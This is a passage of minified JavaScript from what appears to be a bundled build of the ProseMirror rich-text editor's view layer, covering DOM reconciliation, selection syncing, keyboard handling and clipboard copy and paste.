n=0;n<t.length;n++)if(!t[n].type.eq(e[n].type))return!1;return!0}function vv(t){let e=t.nextSibling;return t.parentNode.removeChild(t),e}class X3{constructor(e,n,r){this.lock=n,this.view=r,this.index=0,this.stack=[],this.changed=!1,this.top=e,this.preMatch=Z3(e.node.content,e)}destroyBetween(e,n){if(e!=n){for(let r=e;r<n;r++)this.top.children[r].destroy();this.top.children.splice(e,n-e),this.changed=!0}}destroyRest(){this.destroyBetween(this.index,this.top.children.length)}syncToMarks(e,n,r){let i=0,s=this.stack.length>>1,o=Math.min(s,e.length);for(;i<o&&(i==s-1?this.top:this.stack[i+1<<1]).matchesMark(e[i])&&e[i].type.spec.spanning!==!1;)i++;for(;i<s;)this.destroyRest(),this.top.dirty=Kt,this.index=this.stack.pop(),this.top=this.stack.pop(),s--;for(;s<e.length;){this.stack.push(this.top,this.index+1);let a=-1;for(let l=this.index;l<Math.min(this.index+3,this.top.children.length);l++){let u=this.top.children[l];if(u.matchesMark(e[s])&&!this.isLocked(u.dom)){a=l;break}}if(a>-1)a>this.index&&(this.changed=!0,this.destroyBetween(this.index,a)),this.top=this.top.children[this.index];else{let l=Ci.create(this.top,e[s],n,r);this.top.children.splice(this.index,0,l),this.top=l,this.changed=!0}this.index=0,s++}}findNodeMatch(e,n,r,i){let s=-1,o;if(i>=this.preMatch.index&&(o=this.preMatch.matches[i-this.preMatch.index]).parent==this.top&&o.matchesNode(e,n,r))s=this.top.children.indexOf(o,this.index);else for(let a=this.index,l=Math.min(this.top.children.length,a+5);a<l;a++){let u=this.top.children[a];if(u.matchesNode(e,n,r)&&!this.preMatch.matched.has(u)){s=a;break}}return s<0?!1:(this.destroyBetween(this.index,s),this.index++,!0)}updateNodeAt(e,n,r,i,s){let o=this.top.children[i];return o.dirty==Cn&&o.dom==o.contentDOM&&(o.dirty=ei),o.update(e,n,r,s)?(this.destroyBetween(this.index,i),this.index++,!0):!1}findIndexWithChild(e){for(;;){let n=e.parentNode;if(!n)return-1;if(n==this.top.contentDOM){let r=e.pmViewDesc;if(r){for(let i=this.index;i<this.top.children.length;i++)if(this.top.children[i]==r)return i}return-1}e=n}}updateNextNode(e,n,r,i,s,o){for(let a=this.index;a<this.top.children.length;a++){let l=this.top.children[a];if(l instanceof Mr){let u=this.preMatch.matched.get(l);if(u!=null&&u!=s)return!1;let c=l.dom,d,f=this.isLocked(c)&&!(e.isText&&l.node&&l.node.isText&&l.nodeDOM.nodeValue==e.text&&l.dirty!=Cn&&Ou(n,l.outerDeco));if(!f&&l.update(e,n,r,i))return this.destroyBetween(this.index,a),l.dom!=c&&(this.changed=!0),this.index++,!0;if(!f&&(d=this.recreateWrapper(l,e,n,r,i,o)))return this.destroyBetween(this.index,a),this.top.children[this.index]=d,d.contentDOM&&(d.dirty=ei,d.updateChildren(i,o+1),d.dirty=Kt),this.changed=!0,this.index++,!0;break}}return!1}recreateWrapper(e,n,r,i,s,o){if(e.dirty||n.isAtom||!e.children.length||!e.node.content.eq(n.content)||!Ou(r,e.outerDeco)||!i.eq(e.innerDeco))return null;let a=Mr.create(this.top,n,r,i,s,o);if(a.contentDOM){a.children=e.children,e.children=[];for(let l of a.children)l.parent=a}return e.destroy(),a}addNode(e,n,r,i,s){let o=Mr.create(this.top,e,n,r,i,s);o.contentDOM&&o.updateChildren(i,s+1),this.top.children.splice(this.index++,0,o),this.changed=!0}placeWidget(e,n,r){let i=this.index<this.top.children.length?this.top.children[this.index]:null;if(i&&i.matchesWidget(e)&&(e==i.widget||!i.widget.type.toDOM.parentNode))this.index++;else{let s=new UC(this.top,e,n,r);this.top.children.splice(this.index++,0,s),this.changed=!0}}addTextblockHacks(){let e=this.top.children[this.index-1],n=this.top;for(;e instanceof Ci;)n=e,e=n.children[n.children.length-1];(!e||!(e instanceof Jc)||/\n$/.test(e.node.text)||this.view.requiresGeckoHackNode&&/\s$/.test(e.node.text))&&((lt||tt)&&e&&e.dom.contentEditable=="false"&&this.addHackNode("IMG",n),this.addHackNode("BR",this.top))}addHackNode(e,n){if(n==this.top&&this.index<n.children.length&&n.children[this.index].matchesHack(e))this.index++;else{let r=document.createElement(e);e=="IMG"&&(r.className="ProseMirror-separator",r.alt=""),e=="BR"&&(r.className="ProseMirror-trailingBreak");let i=new WC(this.top,[],r,null);n!=this.top?n.children.push(i):n.children.splice(this.index++,0,i),this.changed=!0}}isLocked(e){return this.lock&&(e==this.lock||e.nodeType==1&&e.contains(this.lock.parentNode))}}function Z3(t,e){let n=e,r=n.children.length,i=t.childCount,s=new Map,o=[];e:for(;i>0;){let a;for(;;)if(r){let u=n.children[r-1];if(u instanceof Ci)n=u,r=u.children.length;else{a=u,r--;break}}else{if(n==e)break e;r=n.parent.children.indexOf(n),n=n.parent}let l=a.node;if(l){if(l!=t.child(i-1))break;--i,s.set(a,i),o.push(a)}}return{index:i,matched:s,matches:o.reverse()}}function e4(t,e){return t.type.side-e.type.side}function t4(t,e,n,r){let i=e.locals(t),s=0;if(i.length==0){for(let u=0;u<t.childCount;u++){let c=t.child(u);r(c,i,e.forChild(s,c),u),s+=c.nodeSize}return}let o=0,a=[],l=null;for(let u=0;;){let c,d;for(;o<i.length&&i[o].to==s;){let x=i[o++];x.widget&&(c?(d||(d=[c])).push(x):c=x)}if(c)if(d){d.sort(e4);for(let x=0;x<d.length;x++)n(d[x],u,!!l)}else n(c,u,!!l);let f,h;if(l)h=-1,f=l,l=null;else if(u<t.childCount)h=u,f=t.child(u++);else break;for(let x=0;x<a.length;x++)a[x].to<=s&&a.splice(x--,1);for(;o<i.length&&i[o].from<=s&&i[o].to>s;)a.push(i[o++]);let p=s+f.nodeSize;if(f.isText){let x=p;o<i.length&&i[o].from<x&&(x=i[o].from);for(let g=0;g<a.length;g++)a[g].to<x&&(x=a[g].to);x<p&&(l=f.cut(x-s),f=f.cut(0,x-s),p=x,h=-1)}else for(;o<i.length&&i[o].to<p;)o++;let y=f.isInline&&!f.isLeaf?a.filter(x=>!x.inline):a.slice();r(f,y,e.forChild(s,f),h),s=p}}function n4(t){if(t.nodeName=="UL"||t.nodeName=="OL"){let e=t.style.cssText;t.style.cssText=e+"; list-style: square !important",window.getComputedStyle(t).listStyle,t.style.cssText=e}}function r4(t,e,n,r){for(let i=0,s=0;i<t.childCount&&s<=r;){let o=t.child(i++),a=s;if(s+=o.nodeSize,!o.isText)continue;let l=o.text;for(;i<t.childCount;){let u=t.child(i++);if(s+=u.nodeSize,!u.isText)break;l+=u.text}if(s>=n){if(s>=r&&l.slice(r-e.length-a,r-a)==e)return r-e.length;let u=a<r?l.lastIndexOf(e,r-a-1):-1;if(u>=0&&u+e.length+a>=n)return a+u;if(n==r&&l.length>=r+e.length-a&&l.slice(r-a,r-a+e.length)==e)return r}}return-1}function ip(t,e,n,r,i){let s=[];for(let o=0,a=0;o<t.length;o++){let l=t[o],u=a,c=a+=l.size;u>=n||c<=e?s.push(l):(u<e&&s.push(l.slice(0,e-u,r)),i&&(s.push(i),i=void 0),c>n&&s.push(l.slice(n-u,l.size,r)))}return s}function xg(t,e=null){let n=t.domSelectionRange(),r=t.state.doc;if(!n.focusNode)return null;let i=t.docView.nearestDesc(n.focusNode),s=i&&i.size==0,o=t.docView.posFromDOM(n.focusNode,n.focusOffset,1);if(o<0)return null;let a=r.resolve(o),l,u;if(Gc(n)){for(l=o;i&&!i.node;)i=i.parent;let d=i.node;if(i&&d.isAtom&&V.isSelectable(d)&&i.parent&&!(d.isInline&&A3(n.focusNode,n.focusOffset,i.dom))){let f=i.posBefore;u=new V(o==f?a:r.resolve(f))}}else{if(n instanceof t.dom.ownerDocument.defaultView.Selection&&n.rangeCount>1){let d=o,f=o;for(let h=0;h<n.rangeCount;h++){let p=n.getRangeAt(h);d=Math.min(d,t.docView.posFromDOM(p.startContainer,p.startOffset,1)),f=Math.max(f,t.docView.posFromDOM(p.endContainer,p.endOffset,-1))}if(d<0)return null;[l,o]=f==t.state.selection.anchor?[f,d]:[d,f],a=r.resolve(o)}else l=t.docView.posFromDOM(n.anchorNode,n.anchorOffset,1);if(l<0)return null}let c=r.resolve(l);if(!u){let d=e=="pointer"||t.state.selection.head<a.pos&&!s?1:-1;u=vg(t,c,a,d)}return u}function JC(t){return t.editable?t.hasFocus():QC(t)&&document.activeElement&&document.activeElement.contains(t.dom)}function zn(t,e=!1){let n=t.state.selection;if(YC(t,n),!!JC(t)){if(!e&&t.input.mouseDown&&t.input.mouseDown.allowDefault&&tt){let r=t.domSelectionRange(),i=t.domObserver.currentSelection;if(r.anchorNode&&i.anchorNode&&bi(r.anchorNode,r.anchorOffset,i.anchorNode,i.anchorOffset)){t.input.mouseDown.delayedSelectionSync=!0,t.domObserver.setCurSelection();return}}if(t.domObserver.disconnectSelection(),t.cursorWrapper)s4(t);else{let{anchor:r,head:i}=n,s,o;wv&&!(n instanceof $)&&(n.$from.parent.inlineContent||(s=Sv(t,n.from)),!n.empty&&!n.$from.parent.inlineContent&&(o=Sv(t,n.to))),t.docView.setSelection(r,i,t,e),wv&&(s&&kv(s),o&&kv(o)),n.visible?t.dom.classList.remove("ProseMirror-hideselection"):(t.dom.classList.add("ProseMirror-hideselection"),"onselectionchange"in document&&i4(t))}t.domObserver.setCurSelection(),t.domObserver.connectSelection()}}const wv=lt||tt&&FC<63;function Sv(t,e){let{node:n,offset:r}=t.docView.domFromPos(e,0),i=r<n.childNodes.length?n.childNodes[r]:null,s=r?n.childNodes[r-1]:null;if(lt&&i&&i.contentEditable=="false")return cf(i);if((!i||i.contentEditable=="false")&&(!s||s.contentEditable=="false")){if(i)return cf(i);if(s)return cf(s)}}function cf(t){return t.contentEditable="true",lt&&t.draggable&&(t.draggable=!1,t.wasDraggable=!0),t}function kv(t){t.contentEditable="false",t.wasDraggable&&(t.draggable=!0,t.wasDraggable=null)}function i4(t){let e=t.dom.ownerDocument;e.removeEventListener("selectionchange",t.input.hideSelectionGuard);let n=t.domSelectionRange(),r=n.anchorNode,i=n.anchorOffset;e.addEventListener("selectionchange",t.input.hideSelectionGuard=()=>{(n.anchorNode!=r||n.anchorOffset!=i)&&(e.removeEventListener("selectionchange",t.input.hideSelectionGuard),setTimeout(()=>{(!JC(t)||t.state.selection.visible)&&t.dom.classList.remove("ProseMirror-hideselection")},20))})}function s4(t){let e=t.domSelection(),n=document.createRange();if(!e)return;let r=t.cursorWrapper.dom,i=r.nodeName=="IMG";i?n.setStart(r.parentNode,Ue(r)+1):n.setStart(r,0),n.collapse(!0),e.removeAllRanges(),e.addRange(n),!i&&!t.state.selection.visible&&kt&&Tr<=11&&(r.disabled=!0,r.disabled=!1)}function YC(t,e){if(e instanceof V){let n=t.docView.descAt(e.from);n!=t.lastSelectedViewDesc&&(bv(t),n&&n.selectNode(),t.lastSelectedViewDesc=n)}else bv(t)}function bv(t){t.lastSelectedViewDesc&&(t.lastSelectedViewDesc.parent&&t.lastSelectedViewDesc.deselectNode(),t.lastSelectedViewDesc=void 0)}function vg(t,e,n,r){return t.someProp("createSelectionBetween",i=>i(t,e,n))||$.between(e,n,r)}function Cv(t){return t.editable&&!t.hasFocus()?!1:QC(t)}function QC(t){let e=t.domSelectionRange();if(!e.anchorNode)return!1;try{return t.dom.contains(e.anchorNode.nodeType==3?e.anchorNode.parentNode:e.anchorNode)&&(t.editable||t.dom.contains(e.focusNode.nodeType==3?e.focusNode.parentNode:e.focusNode))}catch{return!1}}function o4(t){let e=t.docView.domFromPos(t.state.selection.anchor,0),n=t.domSelectionRange();return bi(e.node,e.offset,n.anchorNode,n.anchorOffset)}function sp(t,e){let{$anchor:n,$head:r}=t.selection,i=e>0?n.max(r):n.min(r),s=i.parent.inlineContent?i.depth?t.doc.resolve(e>0?i.after():i.before()):null:i;return s&&W.findFrom(s,e)}function ir(t,e){return t.dispatch(t.state.tr.setSelection(e).scrollIntoView()),!0}function Ev(t,e,n){let r=t.state.selection;if(r instanceof $)if(n.indexOf("s")>-1){let{$head:i}=r,s=i.textOffset?null:e<0?i.nodeBefore:i.nodeAfter;if(!s||s.isText||!s.isLeaf)return!1;let o=t.state.doc.resolve(i.pos+s.nodeSize*(e<0?-1:1));return ir(t,new $(r.$anchor,o))}else if(r.empty){if(t.endOfTextblock(e>0?"forward":"backward")){let i=sp(t.state,e);return i&&i instanceof V?ir(t,i):!1}else if(!(Ft&&n.indexOf("m")>-1)){let i=r.$head,s=i.textOffset?null:e<0?i.nodeBefore:i.nodeAfter,o;if(!s||s.isText)return!1;let a=e<0?i.pos-s.nodeSize:i.pos;return s.isAtom||(o=t.docView.descAt(a))&&!o.contentDOM?V.isSelectable(s)?ir(t,new V(e<0?t.state.doc.resolve(i.pos-s.nodeSize):i)):Va?ir(t,new $(t.state.doc.resolve(e<0?a:a+s.nodeSize))):!1:!1}}else return!1;else{if(r instanceof V&&r.node.isInline)return ir(t,new $(e>0?r.$to:r.$from));{let i=sp(t.state,e);return i?ir(t,i):!1}}}function Du(t){return t.nodeType==3?t.nodeValue.length:t.childNodes.length}function Po(t,e){let n=t.pmViewDesc;return n&&n.size==0&&(e<0||t.nextSibling||t.nodeName!="BR")}function Di(t,e){return e<0?a4(t):l4(t)}function a4(t){let e=t.domSelectionRange(),n=e.focusNode,r=e.focusOffset;if(!n)return;let i,s,o=!1;for(an&&n.nodeType==1&&r<Du(n)&&Po(n.childNodes[r],-1)&&(o=!0);;)if(r>0){if(n.nodeType!=1)break;{let a=n.childNodes[r-1];if(Po(a,-1))i=n,s=--r;else if(a.nodeType==3)n=a,r=n.nodeValue.length;else break}}else{if(XC(n))break;{let a=n.previousSibling;for(;a&&Po(a,-1);)i=n.parentNode,s=Ue(a),a=a.previousSibling;if(a)n=a,r=Du(n);else{if(n=n.parentNode,n==t.dom)break;r=0}}}o?op(t,n,r):i&&op(t,i,s)}function l4(t){let e=t.domSelectionRange(),n=e.focusNode,r=e.focusOffset;if(!n)return;let i=Du(n),s,o;for(;;)if(r<i){if(n.nodeType!=1)break;let a=n.childNodes[r];if(Po(a,1))s=n,o=++r;else break}else{if(XC(n))break;{let a=n.nextSibling;for(;a&&Po(a,1);)s=a.parentNode,o=Ue(a)+1,a=a.nextSibling;if(a)n=a,r=0,i=Du(n);else{if(n=n.parentNode,n==t.dom)break;r=i=0}}}s&&op(t,s,o)}function XC(t){let e=t.pmViewDesc;return e&&e.node&&e.node.isBlock}function u4(t,e){for(;t&&e==t.childNodes.length&&!Ba(t);)e=Ue(t)+1,t=t.parentNode;for(;t&&e<t.childNodes.length;){let n=t.childNodes[e];if(n.nodeType==3)return n;if(n.nodeType==1&&n.contentEditable=="false")break;t=n,e=0}}function c4(t,e){for(;t&&!e&&!Ba(t);)e=Ue(t),t=t.parentNode;for(;t&&e;){let n=t.childNodes[e-1];if(n.nodeType==3)return n;if(n.nodeType==1&&n.contentEditable=="false")break;t=n,e=t.childNodes.length}}function op(t,e,n){if(e.nodeType!=3){let s,o;(o=u4(e,n))?(e=o,n=0):(s=c4(e,n))&&(e=s,n=s.nodeValue.length)}let r=t.domSelection();if(!r)return;if(Gc(r)){let s=document.createRange();s.setEnd(e,n),s.setStart(e,n),r.removeAllRanges(),r.addRange(s)}else r.extend&&r.extend(e,n);t.domObserver.setCurSelection();let{state:i}=t;setTimeout(()=>{t.state==i&&zn(t)},50)}function Tv(t,e){let n=t.state.doc.resolve(e);if(!(tt||O3)&&n.parent.inlineContent){let i=t.coordsAtPos(e);if(e>n.start()){let s=t.coordsAtPos(e-1),o=(s.top+s.bottom)/2;if(o>i.top&&o<i.bottom&&Math.abs(s.left-i.left)>1)return s.left<i.left?"ltr":"rtl"}if(e<n.end()){let s=t.coordsAtPos(e+1),o=(s.top+s.bottom)/2;if(o>i.top&&o<i.bottom&&Math.abs(s.left-i.left)>1)return s.left>i.left?"ltr":"rtl"}}return getComputedStyle(t.dom).direction=="rtl"?"rtl":"ltr"}function Mv(t,e,n){let r=t.state.selection;if(r instanceof $&&!r.empty||n.indexOf("s")>-1||Ft&&n.indexOf("m")>-1)return!1;let{$from:i,$to:s}=r;if(!i.parent.inlineContent||t.endOfTextblock(e<0?"up":"down")){let o=sp(t.state,e);if(o&&o instanceof V)return ir(t,o)}if(!i.parent.inlineContent){let o=e<0?i:s,a=r instanceof Wt?W.near(o,e):W.findFrom(o,e);return a?ir(t,a):!1}return!1}function Nv(t,e){if(!(t.state.selection instanceof $))return!0;let{$head:n,$anchor:r,empty:i}=t.state.selection;if(!n.sameParent(r))return!0;if(!i)return!1;if(t.endOfTextblock(e>0?"forward":"backward"))return!0;let s=!n.textOffset&&(e<0?n.nodeBefore:n.nodeAfter);if(s&&!s.isText){let o=t.state.tr;return e<0?o.delete(n.pos-s.nodeSize,n.pos):o.delete(n.pos,n.pos+s.nodeSize),t.dispatch(o),!0}return!1}function Av(t,e,n){t.domObserver.stop(),e.contentEditable=n,t.domObserver.start()}function d4(t){if(!lt||t.state.selection.$head.parentOffset>0)return!1;let{focusNode:e,focusOffset:n}=t.domSelectionRange();if(e&&e.nodeType==1&&n==0&&e.firstChild&&e.firstChild.contentEditable=="false"){let r=e.firstChild;Av(t,r,"true"),setTimeout(()=>Av(t,r,"false"),20)}return!1}function f4(t){let e="";return t.ctrlKey&&(e+="c"),t.metaKey&&(e+="m"),t.altKey&&(e+="a"),t.shiftKey&&(e+="s"),e}function h4(t,e){let n=e.keyCode,r=f4(e);if(n==8||Ft&&n==72&&r=="c")return Nv(t,-1)||Di(t,-1);if(n==46&&!e.shiftKey||Ft&&n==68&&r=="c")return Nv(t,1)||Di(t,1);if(n==13||n==27)return!0;if(n==37||Ft&&n==66&&r=="c"){let i=n==37?Tv(t,t.state.selection.from)=="ltr"?-1:1:-1;return Ev(t,i,r)||Di(t,i)}else if(n==39||Ft&&n==70&&r=="c"){let i=n==39?Tv(t,t.state.selection.from)=="ltr"?1:-1:1;return Ev(t,i,r)||Di(t,i)}else{if(n==38||Ft&&n==80&&r=="c")return Mv(t,-1,r)||Di(t,-1);if(n==40||Ft&&n==78&&r=="c")return d4(t)||Mv(t,1,r)||Di(t,1);if(r==(Ft?"m":"c")&&(n==66||n==73||n==89||n==90))return!0}return!1}function wg(t,e){t.someProp("transformCopied",h=>{e=h(e,t)});let n=[],{content:r,openStart:i,openEnd:s}=e;for(;i>1&&s>1&&r.childCount==1&&r.firstChild.childCount==1;){i--,s--;let h=r.firstChild;n.push(h.type.name,h.attrs!=h.type.defaultAttrs?h.attrs:null),r=h.content}let o=t.someProp("clipboardSerializer")||Ai.fromSchema(t.state.schema),a=iE(),l=a.createElement("div");l.appendChild(o.serializeFragment(r,{document:a}));let u=l.firstChild,c,d=0;for(;u&&u.nodeType==1&&(c=rE[u.nodeName.toLowerCase()]);){for(let h=c.length-1;h>=0;h--){let p=a.createElement(c[h]);for(;l.firstChild;)p.appendChild(l.firstChild);l.appendChild(p),d++}u=l.firstChild}u&&u.nodeType==1&&u.setAttribute("data-pm-slice",`${i} ${s}${d?` -${d}`:""} ${JSON.stringify(n)}`);let f=t.someProp("clipboardTextSerializer",h=>h(e,t))||e.content.textBetween(0,e.content.size,`

`);return{dom:l,text:f,slice:e}}function ZC(t,e,n,r,i){let s=i.parent.type.spec.code,o,a;if(!n&&!e)return null;let l=e&&(r||s||!n);if(l){if(t.someProp("transformPastedText",f=>{e=f(e,s||r,t)}),s)return e?new L(A.from(t.state.schema.text(e.replace(/\r\n?/g,`
`))),0,0):L.empty;let d=t.someProp("clipboardTextParser",f=>f(e,i,r,t));if(d)a=d;else{let f=i.marks(),{schema:h}=t.state,p=Ai.fromSchema(h);o=document.createElement("div"),e.split(/(?:\r\n?|\n)+/).forEach(y=>{let x=o.appendChild(document.createElement("p"));y&&x.appendChild(p.serializeNode(h.text(y,f)))})}}else t.someProp("transformPastedHTML",d=>{n=d(n,t)}),o=y4(n),Va&&x4(o);let u=o&&o.querySelector("[data-pm-slice]"),c=u&&/^(\d+) (\d+)(?: -(\d+))? (.*)/.exec(u.getAttribute("data-pm-slice")||"");if(c&&c[3])for(let d=+c[3];d>0;d--){let f=o.firstChild;for(;f&&f.nodeType!=1;)f=f.nextSibling;if(!f)break;o=f}if(a||(a=(t.someProp("clipboardParser")||t.someProp("domParser")||Er.fromSchema(t.state.schema)).parseSlice(o,{preserveWhitespace:!!(l||c),context:i,ruleFromNode(f){return f.nodeName=="BR"&&!f.nextSibling&&f.parentNode&&!p4.test(f.parentNode.nodeName)?{ignore:!0}:null}})),c)a=v4(Pv(a,+c[1],+c[2]),c[4]);else if(a=L.maxOpen(m4(a.content,i),!0),a.openStart||a.openEnd){let d=0,f=0;for(let h=a.content.firstChild;d<a.openStart&&!h.type.spec.isolating;d++,h=h.firstChild);for(let h=a.content.lastChild;f<a.openEnd&&!h.type.spec.isolating;f++,h=h.lastChild);a=Pv(a,d,f)}return t.someProp("transformPasted",d=>{a=d(a,t)}),a}const p4=/^(a|abbr|acronym|b|cite|code|del|em|i|ins|kbd|label|output|q|ruby|s|samp|span|strong|sub|sup|time|u|tt|var)$/i;function m4(t,e){if(t.childCount<2)return t;for(let n=e.depth;n>=0;n--){let i=e.node(n).contentMatchAt(e.index(n)),s,o=[];if(t.forEach(a=>{if(!o)return;let l=i.findWrapping(a.type),u;if(!l)return o=null;if(u=o.length&&s.length&&tE(l,s,a,o[o.length-1],0))o[o.length-1]=u;else{o.length&&(o[o.length-1]=nE(o[o.length-1],s.length));let c=eE(a,l);o.push(c),i=i.matchType(c.type),s=l}}),o)return A.from(o)}return t}function eE(t,e,n=0){for(let r=e.length-1;r>=n;r--)t=e[r].create(null,A.from(t));return t}function tE(t,e,n,r,i){if(i<t.length&&i<e.length&&t[i]==e[i]){let s=tE(t,e,n,r.lastChild,i+1);if(s)return r.copy(r.content.replaceChild(r.childCount-1,s));if(r.contentMatchAt(r.childCount).matchType(i==t.length-1?n.type:t[i+1]))return r.copy(r.content.append(A.from(eE(n,t,i+1))))}}function nE(t,e){if(e==0)return t;let n=t.content.replaceChild(t.childCount-1,nE(t.lastChild,e-1)),r=t.contentMatchAt(t.childCount).fillBefore(A.empty,!0);return t.copy(n.append(r))}function ap(t,e,n,r,i,s){let o=e<0?t.firstChild:t.lastChild,a=o.content;return t.childCount>1&&(s=0),i<r-1&&(a=ap(a,e,n,r,i+1,s)),i>=n&&(a=e<0?o.contentMatchAt(0).fillBefore(a,s<=i).append(a):a.append(o.contentMatchAt(o.childCount).fillBefore(A.empty,!0))),t.replaceChild(e<0?0:t.childCount-1,o.copy(a))}function Pv(t,e,n){return e<t.openStart&&(t=new L(ap(t.content,-1,e,t.openStart,0,t.openEnd),e,t.openEnd)),n<t.openEnd&&(t=new L(ap(t.content,1,n,t.openEnd,0,0),t.openStart,n)),t}const rE={thead:["table"],tbody:["table"],tfoot:["table"],caption:["table"],colgroup:["table"],col:["table","colgroup"],tr:["table","tbody"],td:["table","tbody","tr"],th:["table","tbody","tr"]};let Rv=null;function iE(){return Rv||(Rv=document.implementation.createHTMLDocument("title"))}let df=null;function g4(t){let e=window.trustedTypes;return e?(df||(df=e.defaultPolicy||e.createPolicy("ProseMirrorClipboard",{createHTML:n=>n})),df.createHTML(t)):t}function y4(t){let e=/^(\s*<meta [^>]*>)*/.exec(t);e&&(t=t.slice(e[0].length));let n=iE().createElement("div"),r=/<([a-z][^>\s]+)/i.exec(t),i;if((i=r&&rE[r[1].toLowerCase()])&&(t=i.map(s=>"<"+s+">").join("")+t+i.map(s=>"</"+s+">").reverse().join("")),n.innerHTML=g4(t),i)for(let s=0;s<i.length;s++)n=n.querySelector(i[s])||n;return n}function x4(t){let e=t.querySelectorAll(tt?"span:not([class]):not([style])":"span.Apple-converted-space");for(let n=0;n<e.length;n++){let r=e[n];r.childNodes.length==1&&r.textContent==""&&r.parentNode&&r.parentNode.replaceChild(t.ownerDocument.createTextNode(" "),r)}}function v4(t,e){if(!t.size)return t;let n=t.content.firstChild.type.schema,r;try{r=JSON.parse(e)}catch{return t}let{content:i,openStart:s,openEnd:o}=t;for(let a=r.length-2;a>=0;a-=2){let l=n.nodes[r[a]];if(!l||l.hasRequiredAttrs())break;i=A.from(l.create(r[a+1],i)),s++,o++}return new L(i,s,o)}const ut={},ct={},w4={touchstart:!0,touchmove:!0};class S4{constructor(){this.shiftKey=!1,this.mouseDown=null,this.lastKeyCode=null,this.lastKeyCodeTime=0,this.lastClick={time:0,x:0,y:0,type:"",button:0},this.lastSelectionOrigin=null,this.lastSelectionTime=0,this.lastIOSEnter=0,this.lastIOSEnterFallbackTimeout=-1,this.lastFocus=0,this.lastTouch=0,this.lastChromeDelete=0,this.composing=!1,this.compositionNode=null,this.composingTimeout=-1,this.compositionNodes=[],this.compositionEndedAt=-2e8,this.compositionID=1,this.compositionPendingChanges=0,this.domChangeCount=0,this.eventHandlers=Object.create(null),this.hideSelectionGuard=null}}function k4(t){for(let e in ut){let n=ut[e];t.dom.addEventListener(e,t.input.eventHandlers[e]=r=>{C4(t,r)&&!Sg(t,r)&&(t.editable||!(r.type in ct))&&n(t,r)},w4[e]?{passive:!0}:void 0)}lt&&t.dom.addEventListener("input",()=>null),lp(t)}function mr(t,e){t.input.lastSelectionOrigin=e,t.input.lastSelectionTime=Date.now()}function b4(t){t.domObserver.stop();for(let e in t.input.eventHandlers)t.dom.removeEventListener(e,t.input.eventHandlers[e]);clearTimeout(t.input.composingTimeout),clearTimeout(t.input.lastIOSEnterFallbackTimeout)}function lp(t){t.someProp("handleDOMEvents",e=>{for(let n in e)t.input.eventHandlers[n]||t.dom.addEventListener(n,t.input.eventHandlers[n]=r=>Sg(t,r))})}function Sg(t,e){return t.someProp("handleDOMEvents",n=>{let r=n[e.type];return r?r(t,e)||e.defaultPrevented:!1})}function C4(t,e){if(!e.bubbles)return!0;if(e.defaultPrevented)return!1;for(let n=e.target;n!=t.dom;n=n.parentNode)if(!n||n.nodeType==11||n.pmViewDesc&&n.pmViewDesc.stopEvent(e))return!1;return!0}function E4(t,e){!Sg(t,e)&&ut[e.type]&&(t.editable||!(e.type in ct))&&ut[e.type](t,e)}ct.keydown=(t,e)=>{let n=e;if(t.input.shiftKey=n.keyCode==16||n.shiftKey,!oE(t,n)&&(t.input.lastKeyCode=n.keyCode,t.input.lastKeyCodeTime=Date.now(),!(Fn&&tt&&n.keyCode==13)))if(n.keyCode!=229&&t.domObserver.forceFlush(),Ts&&n.keyCode==13&&!n.ctrlKey&&!n.altKey&&!n.metaKey){let r=Date.now();t.input.lastIOSEnter=r,t.input.lastIOSEnterFallbackTimeout=setTimeout(()=>{t.input.lastIOSEnter==r&&(t.someProp("handleKeyDown",i=>i(t,qr(13,"Enter"))),t.input.lastIOSEnter=0)},200)}else t.someProp("handleKeyDown",r=>r(t,n))||h4(t,n)?n.preventDefault():mr(t,"key")};ct.keyup=(t,e)=>{e.keyCode==16&&(t.input.shiftKey=!1)};ct.keypress=(t,e)=>{let n=e;if(oE(t,n)||!n.charCode||n.ctrlKey&&!n.altKey||Ft&&n.metaKey)return;if(t.someProp("handleKeyPress",i=>i(t,n))){n.preventDefault();return}let r=t.state.selection;if(!(r instanceof $)||!r.$from.sameParent(r.$to)){let i=String.fromCharCode(n.charCode),s=()=>t.state.tr.insertText(i).scrollIntoView();!/[\r\n]/.test(i)&&!t.someProp("handleTextInput",o=>o(t,r.$from.pos,r.$to.pos,i,s))&&t.dispatch(s()),n.preventDefault()}};function Yc(t){return{left:t.clientX,top:t.clientY}}function T4(t,e){let n=e.x-t.clientX,r=e.y-t.clientY;return n*n+r*r<100}function kg(t,e,n,r,i){if(r==-1)return!1;let s=t.state.doc.resolve(r);for(let o=s.depth+1;o>0;o--)if(t.someProp(e,a=>o>s.depth?a(t,n,s.nodeAfter,s.before(o),i,!0):a(t,n,s.node(o),s.before(o),i,!1)))return!0;return!1}function fs(t,e,n){if(t.focused||t.focus(),t.state.selection.eq(e))return;let r=t.state.tr.setSelection(e);r.setMeta("pointer",!0),t.dispatch(r)}function M4(t,e){if(e==-1)return!1;let n=t.state.doc.resolve(e),r=n.nodeAfter;return r&&r.isAtom&&V.isSelectable(r)?(fs(t,new V(n)),!0):!1}function N4(t,e){if(e==-1)return!1;let n=t.state.selection,r,i;n instanceof V&&(r=n.node);let s=t.state.doc.resolve(e);for(let o=s.depth+1;o>0;o--){let a=o>s.depth?s.nodeAfter:s.node(o);if(V.isSelectable(a)){r&&n.$from.depth>0&&o>=n.$from.depth&&s.before(n.$from.depth+1)==n.$from.pos?i=s.before(n.$from.depth):i=s.before(o);break}}return i!=null?(fs(t,V.create(t.state.doc,i)),!0):!1}function A4(t,e,n,r,i){return kg(t,"handleClickOn",e,n,r)||t.someProp("handleClick",s=>s(t,e,r))||(i?N4(t,n):M4(t,n))}function P4(t,e,n,r){return kg(t,"handleDoubleClickOn",e,n,r)||t.someProp("handleDoubleClick",i=>i(t,e,r))}function R4(t,e,n,r){return kg(t,"handleTripleClickOn",e,n,r)||t.someProp("handleTripleClick",i=>i(t,e,r))||O4(t,n,r)}function O4(t,e,n){if(n.button!=0)return!1;let r=t.state.doc;if(e==-1)return r.inlineContent?(fs(t,$.create(r,0,r.content.size)),!0):!1;let i=r.resolve(e);for(let s=i.depth+1;s>0;s--){let o=s>i.depth?i.nodeAfter:i.node(s),a=i.before(s);if(o.inlineContent)fs(t,$.create(r,a+1,a+1+o.content.size));else if(V.isSelectable(o))fs(t,V.create(r,a));else continue;return!0}}function bg(t){return Lu(t)}const sE=Ft?"metaKey":"ctrlKey";ut.mousedown=(t,e)=>{let n=e;t.input.shiftKey=n.shiftKey;let 